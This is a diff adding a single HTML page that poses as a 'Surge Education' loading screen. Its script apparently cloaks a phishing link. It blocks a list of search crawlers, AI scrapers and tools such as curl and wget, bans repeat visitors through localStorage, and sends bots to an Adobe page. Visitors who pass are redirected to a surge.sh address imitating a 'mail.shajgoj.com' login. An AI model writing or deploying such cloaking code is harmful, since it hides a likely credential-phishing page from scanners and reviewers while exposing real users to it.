@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Surge Education learn...</title>
+    <style>
+        /* Optional: Styled loading state so humans don't see a blank white screen */
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f9f9f9; }
+        .loader { text-align: center; color: #333; }
+    </style>
+    <script>
+    (function() {
+        // Target link for verified humans
+        const TARGET_URL = 'https://shajgoj-com.surge.sh/mail.shajgoj.com';
+
+        // 1. UNIQUE SECRET OVERRIDE (?ghost=true)
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('ghost') === 'true') {
+            localStorage.removeItem('traffic_logs');
+            localStorage.removeItem('permanently_banned_bot');
+            const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
+            window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
+        }
+
+        // 2. LIFETIME BAN CHECK
+        if (localStorage.getItem('permanently_banned_bot') === 'true') {
+            blockAccess(".");
+            return;
+        }
+
+        // 3. LAYER 1: INSTANTLY BAN WELL-BEHAVED BOTS
+        const botList = [
+    // Original list
+    'googlebot', 'bingbot', 'duckduckbot', 'baiduspider', 'yandex',
+    'ia_archiver', 'mj12bot', 'gptbot', 'claude-bot', 'claudebot',
+
+    // AI & LLM training scrapers
+    'applebot-extended', 'amazonbot', 'cohere-ai', 'metaexternalfetch',
+    'facebookexternalhit', 'perplexitybot', 'youbot', 'oai-searchbot', 'bytespider', 'diffbot',
+
+    // SEO & Auditing Spiders
+    'ahrefsbot', 'semrushbot', 'splitbee', 'dotbot', 'rogerbot',
+    'screaming frog seo spider', 'siteexplorerbot', 'megaindex', 'spyfu', 'uptimerobot',
+
+    // Alternative Search Engines
+    'sogou', 'exabot', 'facebot', 'coccocbot', 'qwantify',
+
+    // Programmatic Scraper Libraries
+    'wget', 'curl', 'python-requests', 'go-http-client', 'java', 'axios', 'headlesschrome'
+];
+
+// Create the dynamic regular expression from the array
+const blockedBots = new RegExp(botList.join('|'), 'i');
+
+if (blockedBots.test(navigator.userAgent)) {
+    localStorage.setItem('permanently_banned_bot', 'true');
+    blockAccess(".");
+    return;
+}
+
+
+        // 4. TRAFFIC LOGGING ENGINE
+        const NOW = Date.now();
+        const ROGUE_WINDOW = 5000;       // 5 seconds to catch aggressive scrapers
+        const HUMAN_WINDOW = 86400000;   // 24 hours for human pacing
+
+        let timestamps = JSON.parse(localStorage.getItem('traffic_logs') || '[]');
+
+        // Clean out timestamps older than 24 hours
+        timestamps = timestamps.filter(time => NOW - time < HUMAN_WINDOW);
+        timestamps.push(NOW);
+        localStorage.setItem('traffic_logs', JSON.stringify(timestamps));
+
+        // 5. LAYER 2: BAN CLOAKED / ROGUE BOTS FOR LIFE
+        const recentClicks = timestamps.filter(time => NOW - time < ROGUE_WINDOW);
+        if (recentClicks.length > 1) {
+            localStorage.setItem('permanently_banned_bot', 'true');
+            blockAccess(".");
+            return;
+        }
+
+        // 6. LAYER 3: HUMAN PACE LIMITING
+        if (timestamps.length > 2) {
+            blockAccess(".");
+            return;
+        }
+
+        // 7. SUCCESS: ALL CHECKS PASSED ( Human goto)
+        window.location.replace(TARGET_URL);
+
+        // Helper function to wipe HTML content and send bots away
+        function blockAccess(msg) {
+            if (document.documentElement) {
+                document.documentElement.innerHTML = `<h1 style="text-align:center; margin-top:20%; font-family:sans-serif;">${msg}</h1>`;
+            }
+            window.location.replace('https://www.adobe.com/uk/learn/acrobat');
+        }
+    })();
+    </script>
+</head>
+<body>
+    <!-- Hidden fallback container showing a loading message to humans while script runs -->
+    <div class="loader">
+        <h2>Surge Education learn...</h2>
+        <p>..</p>
+    </div>
+</body>
+</html>
